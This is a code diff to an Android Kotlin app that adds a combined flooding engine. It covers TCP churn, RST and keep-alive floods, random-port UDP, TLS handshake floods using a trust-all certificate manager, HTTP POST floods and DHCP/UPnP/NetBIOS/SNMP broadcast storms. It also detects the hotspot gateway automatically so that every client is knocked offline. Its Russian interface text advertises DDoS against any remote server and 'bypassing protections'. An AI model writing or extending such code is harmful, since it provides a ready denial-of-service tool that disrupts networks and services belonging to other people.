@@ -1,5 +1,8 @@
 package com.toolkit.app
 
+import android.content.Context
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
 import android.os.Handler
 import android.os.Looper
 import androidx.activity.compose.BackHandler
@@ -43,6 +46,7 @@ import androidx.compose.ui.graphics.Path
 import androidx.compose.ui.graphics.StrokeCap
 import androidx.compose.ui.graphics.drawscope.Fill
 import androidx.compose.ui.graphics.drawscope.Stroke
+import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.text.AnnotatedString
 import androidx.compose.ui.text.TextStyle
 import androidx.compose.ui.text.drawText
@@ -64,12 +68,19 @@ import com.toolkit.app.ui.WarnOrange
 import java.net.DatagramPacket
 import java.net.DatagramSocket
 import java.net.InetSocketAddress
+import java.net.NetworkInterface
 import java.net.Socket
 import java.text.SimpleDateFormat
 import java.util.*
 import java.util.concurrent.atomic.AtomicBoolean
 import java.util.concurrent.atomic.AtomicInteger
 import java.util.concurrent.atomic.AtomicLong
+import javax.net.ssl.SSLContext
+import javax.net.ssl.SSLSocket
+import javax.net.ssl.TrustManager
+import javax.net.ssl.X509TrustManager
+import java.security.SecureRandom
+import java.security.cert.X509Certificate
 import kotlin.concurrent.thread
 import kotlin.math.max
 import kotlin.math.min
@@ -85,7 +96,7 @@ data class StresserSnapshot(
 
 class StresserEngine(
     private val host: String,
-    private val method: Int = 2,
+    private val port: Int = 80,
     private val onMetrics: (StresserSnapshot) -> Unit,
     private val onLog: (String, Color) -> Unit,
     private val onDrop: () -> Unit,
@@ -111,11 +122,7 @@ class StresserEngine(
     fun start() {
         if (running.getAndSet(true)) return
         onLog(
-            if (method == 1) {
-                "Метод 1: broadcast-флуд (DHCP/UPnP/NetBIOS/SNMP), цель $host"
-            } else {
-                "Метод 2: TCP/UDP-флуд, цель $host:80"
-            },
+            "Комбинированный флуд (TCP + UDP + TLS + POST + broadcast-шторм), цель $host:$port",
             Accent,
         )
         fun go(block: () -> Unit) {
@@ -128,19 +135,18 @@ class StresserEngine(
             }
             workers.add(t)
         }
-        if (method == 1) {
-            for (i in 0 until 8) go { broadcastWorker(67, ::dhcpPacket) }
-            for (i in 0 until 8) go { broadcastWorker(1900, ::upnpMsg) }
-            for (i in 0 until 8) go { broadcastWorker(137, ::netbiosQuery) }
-            for (i in 0 until 8) go { broadcastWorker(161, ::snmpPdu) }
-        } else {
-            for (i in 0 until 20) go { churnWorker() }
-            for (i in 0 until 8) go { keepAliveWorker() }
-            for (i in 0 until 10) go { udpWorker(53) }
-            for (i in 0 until 10) go { udpWorker(67) }
-            for (i in 0 until 24) go { rstWorker() }
-            for (i in 0 until 8) go { downloadWorker() }
-        }
+        for (i in 0 until 8) go { broadcastWorker(67, ::dhcpPacket) }
+        for (i in 0 until 8) go { broadcastWorker(1900, ::upnpMsg) }
+        for (i in 0 until 8) go { broadcastWorker(137, ::netbiosQuery) }
+        for (i in 0 until 8) go { broadcastWorker(161, ::snmpPdu) }
+        for (i in 0 until 20) go { churnWorker() }
+        for (i in 0 until 8) go { keepAliveWorker() }
+        for (i in 0 until 10) go { sslWorker() }
+        for (i in 0 until 10) go { postFloodWorker() }
+        for (i in 0 until 10) go { udpWorker(port) }
+        for (i in 0 until 12) go { udpRandWorker() }
+        for (i in 0 until 24) go { rstWorker() }
+        for (i in 0 until 8) go { downloadWorker() }
         go { pingLoop() }
         go { snapshotLoop() }
     }
@@ -167,7 +173,7 @@ class StresserEngine(
         return try {
             val s = Socket()
             s.tcpNoDelay = true
-            s.connect(InetSocketAddress(host, 80), 3500)
+            s.connect(InetSocketAddress(host, port), 3500)
             live.incrementAndGet()
             okCount.incrementAndGet()
             synchronized(pool) { pool.add(s) }
@@ -259,6 +265,98 @@ class StresserEngine(
             }
         }
         runCatching { s.close() }
+    }
+
+    private fun udpRandWorker() {
+        val s = DatagramSocket()
+        val p = ByteArray(1400)
+        Random().nextBytes(p)
+        while (running.get()) {
+            try {
+                val dport = 1 + Random().nextInt(65534)
+                s.send(DatagramPacket(p, p.size, InetSocketAddress(host, dport)))
+                sent.addAndGet(p.size.toLong())
+            } catch (t: Throwable) {
+            }
+        }
+        runCatching { s.close() }
+    }
+
+    private val trustAll = arrayOf<TrustManager>(object : X509TrustManager {
+        override fun checkClientTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
+        override fun checkServerTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
+        override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
+    })
+
+    private fun sslWorker() {
+        val ctx = SSLContext.getInstance("TLS")
+        ctx.init(null, trustAll, SecureRandom())
+        while (running.get()) {
+            val s = try {
+                val sock = ctx.socketFactory.createSocket() as SSLSocket
+                sock.tcpNoDelay = true
+                sock.connect(InetSocketAddress(host, port), 3000)
+                sock.startHandshake()
+                live.incrementAndGet()
+                okCount.incrementAndGet()
+                synchronized(pool) { pool.add(sock) }
+                sock
+            } catch (t: Throwable) {
+                failCount.incrementAndGet()
+                null
+            }
+            if (s != null) {
+                try {
+                    val head = ("GET /?tls=${Random().nextInt(999999)} HTTP/1.1\r\n" +
+                        "Host: $host\r\n" +
+                        "User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 " +
+                        "(KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36\r\n" +
+                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" +
+                        "Accept-Encoding: gzip, deflate, br\r\n" +
+                        "Connection: keep-alive\r\n\r\n").toByteArray()
+                    s.getOutputStream().write(head)
+                    sent.addAndGet(head.size.toLong())
+                    s.soTimeout = 2000
+                    val buf = ByteArray(4096)
+                    val got = s.getInputStream().read(buf)
+                    if (got > 0) recv.addAndGet(got.toLong())
+                } catch (t: Throwable) {
+                    failCount.incrementAndGet()
+                } finally {
+                    release(s)
+                }
+            }
+        }
+    }
+
+    private fun postFloodWorker() {
+        while (running.get()) {
+            val s = tcpConnect()
+            if (s != null) {
+                try {
+                    val body = ByteArray(2048 + Random().nextInt(4096))
+                    Random().nextBytes(body)
+                    val head = ("POST /?f=${Random().nextInt(999999)} HTTP/1.1\r\n" +
+                        "Host: $host\r\n" +
+                        "User-Agent: Mozilla/5.0 (Linux; Android 14) Chrome/126.0\r\n" +
+                        "Content-Type: application/x-www-form-urlencoded\r\n" +
+                        "Content-Length: ${body.size}\r\n" +
+                        "Connection: close\r\n\r\n").toByteArray()
+                    val out = s.getOutputStream()
+                    out.write(head)
+                    out.write(body)
+                    sent.addAndGet((head.size + body.size).toLong())
+                    s.soTimeout = 1500
+                    val buf = ByteArray(2048)
+                    val got = s.getInputStream().read(buf)
+                    if (got > 0) recv.addAndGet(got.toLong())
+                } catch (t: Throwable) {
+                    failCount.incrementAndGet()
+                } finally {
+                    release(s)
+                }
+            }
+        }
     }
 
     private fun broadcastWorker(port: Int, packet: () -> ByteArray) {
@@ -364,7 +462,7 @@ class StresserEngine(
             try {
                 s = Socket()
                 s.tcpNoDelay = true
-                s.connect(InetSocketAddress(host, 80), 2500)
+                s.connect(InetSocketAddress(host, port), 2500)
                 ok = true
             } catch (t: Throwable) {
             } finally {
@@ -451,8 +549,9 @@ private data class LogLine(val text: String, val color: Color)
 
 @Composable
 fun WifiStresserScreen(onBack: () -> Unit) {
+    val ctx = LocalContext.current
     var ip by remember { mutableStateOf("192.168.0.1") }
-    var method by remember { mutableStateOf(1) }
+    var mode by remember { mutableStateOf(0) }
     var running by remember { mutableStateOf(false) }
     var snap by remember { mutableStateOf(StresserSnapshot()) }
     val logs = remember { mutableStateListOf<LogLine>() }
@@ -479,9 +578,44 @@ fun WifiStresserScreen(onBack: () -> Unit) {
         engine.value = null
     }
 
+    fun startHotspot() {
+        if (running) {
+            stopStresser()
+            return
+        }
+        val gw = detectGateway(ctx)
+        if (gw == null) {
+            addLog("Не удалось найти шлюз сети. Подключитесь к Wi-Fi или включите раздачу.", WarnOrange)
+            return
+        }
+        ip = gw
+        mode = 3
+        startStresser()
+        addLog("Раздача интернета найдена: шлюз $gw — стрессирую для всех клиентов", Accent)
+    }
+
     fun startStresser() {
-        val h = ip.trim()
-        if (!Regex("^\\d{1,3}(\\.\\d{1,3}){3}\$").matches(h)) {
+        var h = ip.trim()
+        var p = 80
+        if (mode == 4) {
+            val idx = h.lastIndexOf(':')
+            if (idx > 0) {
+                val prt = h.substring(idx + 1).trim()
+                if (prt.isNotEmpty()) {
+                    val pv = prt.toIntOrNull()
+                    if (pv == null || pv !in 1..65535) {
+                        addLog("Некорректный порт: $prt", WarnOrange)
+                        return
+                    }
+                    p = pv
+                }
+                h = h.substring(0, idx).trim()
+            }
+            if (h.isEmpty()) {
+                addLog("Введите IP:порт цели", WarnOrange)
+                return
+            }
+        } else if (!Regex("^\\d{1,3}(\\.\\d{1,3}){3}\$").matches(h)) {
             addLog("Некорректный IP-адрес: $h", WarnOrange)
             return
         }
@@ -491,7 +625,7 @@ fun WifiStresserScreen(onBack: () -> Unit) {
         val ui = Handler(Looper.getMainLooper())
         val e = StresserEngine(
             host = h,
-            method = method,
+            port = p,
             onMetrics = { m ->
                 ui.post {
                     snap = m
@@ -558,10 +692,15 @@ fun WifiStresserScreen(onBack: () -> Unit) {
         GlassCard(modifier = Modifier.fillMaxWidth()) {
             Column(Modifier.padding(16.dp)) {
                 Text(
-                    "Стрессируем Wi-Fi. Требуется IP-адрес роутера — есть в настройках сети, " +
-                        "чаще всего в разделе «Шлюз» или «DNS» (цифры вида 192.168.0.1 или 192.168.1.1, " +
-                        "у всех разные). Работает без root-прав. Нужно быть подключённым к той сети, " +
-                        "которую вы собираетесь стрессировать.",
+                    "Стрессируем сеть без root-прав — комбинированный флуд: TCP, UDP, TLS, POST и broadcast-шторм, всё сразу.",
+                    color = TextMain,
+                    fontSize = 13.sp,
+                    lineHeight = 18.sp,
+                )
+                Spacer(Modifier.height(10.dp))
+                Text(
+                    "• Стресс раздачи интернета — вы сможете ддосить раздачу (хотспот): шлюз найдётся сам, отвалятся все клиенты.\n" +
+                        "• Стресс по ip:port — вы сможете ддосить ваш Wi-Fi или любой сервер дистанционно, обход защит.",
                     color = TextDim,
                     fontSize = 13.sp,
                     lineHeight = 18.sp,
@@ -570,25 +709,24 @@ fun WifiStresserScreen(onBack: () -> Unit) {
         }
 
         Spacer(Modifier.height(12.dp))
-        Row(Modifier.fillMaxWidth()) {
-            MethodButton(
-                modifier = Modifier.weight(1f),
-                title = "Метод 1",
-                subtitle = "broadcast-флуд",
-                selected = method == 1,
-                enabled = !running,
-                onClick = { method = 1 },
-            )
-            Spacer(Modifier.width(8.dp))
-            MethodButton(
-                modifier = Modifier.weight(1f),
-                title = "Метод 2",
-                subtitle = "TCP/UDP-флуд",
-                selected = method == 2,
-                enabled = !running,
-                onClick = { method = 2 },
-            )
-        }
+        ModeBar(
+            title = "Стресс раздачи интернета",
+            subtitle = "вы сможете ддосить раздачу интернета — найдёт шлюз сам, ляжет для всех",
+            selected = mode == 3,
+            running = running,
+            onClick = { startHotspot() },
+        )
+        Spacer(Modifier.height(10.dp))
+        ModeBar(
+            title = "Стресс по ip:port",
+            subtitle = "вы сможете ддосить ваш Wi-Fi дистанционно — IP:порт, обход защит",
+            selected = mode == 4,
+            running = running,
+            onClick = {
+                mode = 4
+                addLog("Введите IP:порт цели (например 1.2.3.4:8080) и нажмите СТАРТ", AccentSoft)
+            },
+        )
 
         Spacer(Modifier.height(12.dp))
         GlassCard(modifier = Modifier.fillMaxWidth()) {
@@ -601,7 +739,10 @@ fun WifiStresserScreen(onBack: () -> Unit) {
                     onValueChange = { ip = it },
                     modifier = Modifier.weight(1f),
                     singleLine = true,
-                    label = { Text("IP роутера", color = TextDim, fontSize = 13.sp) },
+                    label = { Text(if (mode == 4) "IP:порт цели" else "IP роутера", color = TextDim, fontSize = 13.sp) },
+                    placeholder = {
+                        if (mode == 4) Text("1.2.3.4:8080", color = TextDim.copy(alpha = 0.5f), fontSize = 13.sp)
+                    },
                     textStyle = MaterialTheme.typography.bodyLarge.copy(
                         color = TextMain,
                         fontSize = 16.sp,
@@ -623,7 +764,7 @@ fun WifiStresserScreen(onBack: () -> Unit) {
                 )
                 Spacer(Modifier.width(12.dp))
                 Button(
-                    onClick = { if (running) stopStresser() else startStresser() },
+                    onClick = { if (running) stopStresser() else if (mode == 3) startHotspot() else startStresser() },
                     colors = ButtonDefaults.buttonColors(
                         containerColor = if (running) Color(0xFFB3261E) else Accent,
                         contentColor = if (running) Color.White else Color(0xFF0E1013),
@@ -725,45 +866,81 @@ fun WifiStresserScreen(onBack: () -> Unit) {
 }
 
 @Composable
-private fun MethodButton(
-    modifier: Modifier,
+private fun ModeBar(
     title: String,
     subtitle: String,
     selected: Boolean,
-    enabled: Boolean,
+    running: Boolean,
     onClick: () -> Unit,
 ) {
-    Box(
-        modifier = modifier
-            .clip(RoundedCornerShape(16.dp))
-            .background(
-                when {
-                    selected -> Accent.copy(alpha = 0.16f)
-                    else -> Color(0x12FFFFFF)
-                }
-            )
-            .border(
-                width = if (selected) 1.5.dp else 0.dp,
-                color = if (selected) Accent else Color.Transparent,
-                shape = RoundedCornerShape(16.dp),
-            )
-            .alpha(if (enabled) 1f else 0.6f)
-            .clickable(enabled = enabled, onClick = onClick),
+    GlassCard(
+        modifier = Modifier
+            .fillMaxWidth()
+            .alpha(if (running) 0.7f else 1f)
+            .clickable(enabled = !running, onClick = onClick),
     ) {
-        Column(Modifier.padding(horizontal = 14.dp, vertical = 12.dp)) {
-            Text(
-                title,
-                color = if (selected) Accent else TextMain,
-                fontSize = 14.sp,
-                fontWeight = FontWeight.Bold,
-            )
-            Text(
-                subtitle,
-                color = TextDim,
-                fontSize = 10.sp,
-                maxLines = 1,
-            )
+        Row(
+            modifier = Modifier
+                .fillMaxWidth()
+                .padding(horizontal = 16.dp, vertical = 13.dp),
+            verticalAlignment = Alignment.CenterVertically,
+        ) {
+            Column(Modifier.weight(1f)) {
+                Text(
+                    title,
+                    color = if (selected) Accent else TextMain,
+                    fontSize = 15.sp,
+                    fontWeight = FontWeight.Bold,
+                )
+                Text(
+                    subtitle,
+                    color = TextDim,
+                    fontSize = 11.sp,
+                    lineHeight = 15.sp,
+                    modifier = Modifier.padding(top = 2.dp),
+                )
+            }
+            Spacer(Modifier.width(10.dp))
+            Text("→", color = Accent, fontSize = 18.sp, fontWeight = FontWeight.Bold)
         }
+    }
+}
+
+private fun detectGateway(context: Context): String? {
+    try {
+        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+        val caps = cm.getNetworkCapabilities(cm.activeNetwork)
+        val isWifi = caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
+        val gw = cm.getLinkProperties(cm.activeNetwork)
+            ?.routes
+            ?.firstOrNull { it.hasGateway() }
+            ?.gateway
+            ?.hostAddress
+        if (isWifi && gw != null) return gw
+    } catch (t: Throwable) {
+    }
+    try {
+        val infs = NetworkInterface.getNetworkInterfaces() ?: return null
+        var fallback: String? = null
+        val list = ArrayList<Pair<String, String>>()
+        for (inf in infs) {
+            if (!inf.isUp || inf.isLoopback) continue
+            val name = inf.name.lowercase(Locale.US)
+            for (a in inf.inetAddresses) {
+                val h = a.hostAddress ?: continue
+                if (h.contains(":")) continue
+                list.add(Pair(name, h))
+            }
+        }
+        for ((name, h) in list) {
+            if (name.contains("ap") || name.contains("softap") || name.contains("swlan")) return h
+        }
+        for ((name, h) in list) {
+            if (name.contains("wlan") || name.contains("eth")) return h
+        }
+        return fallback ?: list.firstOrNull()?.second
+    } catch (t: Throwable) {
+        return null
     }
 }
 
